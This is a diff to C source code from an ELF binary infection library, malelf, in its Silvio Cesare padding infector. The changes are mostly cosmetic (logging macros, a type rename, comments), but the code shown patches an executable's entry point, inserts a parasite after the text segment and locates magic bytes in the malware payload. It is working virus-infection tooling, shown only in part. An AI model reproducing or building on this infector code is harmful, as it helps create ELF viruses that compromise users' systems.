@@ -48,7 +48,7 @@ _u8 malelf_infect_silvio_padding(malelf_object* input,
     int i;
     _i32 error = MALELF_SUCCESS;
     char text_found;
-    elf_t *ielf;
+    malelf_elf_t *ielf;
     ElfW(Ehdr) *ehdr;
     ElfW(Shdr) *shdr;
     ElfW(Phdr) *phdr;
@@ -59,8 +59,6 @@ _u8 malelf_infect_silvio_padding(malelf_object* input,
     unsigned long parasite_vaddr = 0;
     unsigned long text = 0;
 
-    LOG_SUCCESS("Length of parasite is %d bytes\n", parasite->st_info.st_size);
-    
     text_found = 0;
 
     ielf = &input->elf;
@@ -117,13 +115,13 @@ _u8 malelf_infect_silvio_padding(malelf_object* input,
     }
 	 	
     if (!text) {
-        printf("Could not locate text segment, exiting\n");
+        LOG_ERROR("Could not locate text segment, exiting\n");
         exit(-1);
     }
 
-    printf("Text segment starts at 0x%08x\n", (unsigned int) text);
-    printf("Patched entry point from 0x%x to 0x%x\n", (unsigned)old_e_entry, (unsigned)ehdr->e_entry);
-    printf("Inserting parasite at offset %x vaddr 0x%x\n", (unsigned)end_of_text, (unsigned)parasite_vaddr);
+    LOG_SUCCESS("Text segment starts at 0x%08x\n", (unsigned int) text);
+    LOG_SUCCESS("Patched entry point from 0x%x to 0x%x\n", (unsigned)old_e_entry, (unsigned)ehdr->e_entry);
+    LOG_SUCCESS("Inserting parasite at offset %x vaddr 0x%x\n", (unsigned)end_of_text, (unsigned)parasite_vaddr);
 
     ehdr->e_shoff += PAGE_SIZE;
     error = _malelf_parasite_silvio_padding(input, output, end_of_text, parasite, offset_entry_point, old_e_entry, magic_bytes);
@@ -177,8 +175,8 @@ _u8 _malelf_parasite_silvio_padding(malelf_object* input,
             LOG_SUCCESS("Magic number found at '%d' bytes of malware\n", offset_entry_point);
             break;
           }
-        } else { /* didn't find a match */
-          curSearch = 0;                     /* go back to searching for first char */
+        } else { 
+          curSearch = 0;                     /* go back, search for first char */
         }
 
         i++;
